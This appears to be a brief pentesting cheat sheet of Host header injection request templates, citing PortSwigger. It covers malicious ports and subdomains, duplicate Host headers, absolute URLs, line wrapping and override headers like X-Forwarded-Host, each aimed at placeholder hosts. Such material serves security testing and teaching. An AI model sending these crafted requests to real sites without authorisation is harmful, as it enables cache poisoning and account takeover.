- [Host_Header_Injection](#Host_Header_Injection)
 - [Host_Header_Injection malicious port](#HHI_malicious_port)
 - [Host_Header_Injection malicious subdomain](#HHI_malicious_subdomain)
 - [Host_Header_Injection duplicate host headers](#HHI_duplicate_host_headers)
 - [Host Header Injection absolute URL](#HHI_absolute_URL)
 - [Host Header Injection line wrapping](HHI_line_wrapping)
 - [Host Header Injectio_inject_headers](#HHI_inject_headers)

# Host_Header_Injection

## HHI_malicious_port
```
GET /example HTTP/1.1
Host: vulnerable-website.com:bad-stuff-here
```

## HHI_malicious_subdomain
```
GET /example HTTP/1.1
Host: hacked-subdomain.vulnerable-website.com
```

## HHI_duplicate_host_headers
```
GET /example HTTP/1.1
Host: vulnerable-website.com
Host: bad-stuff-here
```

## HHI_absolute URL
```
GET https://vulnerable-website.com/ HTTP/1.1
Host: bad-stuff-here
```

## HHI_line wrapping
```
GET /example HTTP/1.1
 Host: bad-stuff-here
Host: vulnerable-website.com
```

## Inject headers
```
GET /example HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: bad-stuff-here

example headers
X-Host
X-Forwarded-Server
X-HTTP-Host-Override
Forwarded
```
------------------------------------------------------------------------------------------------------------------------------------------------------------------

References
- https://portswigger.net
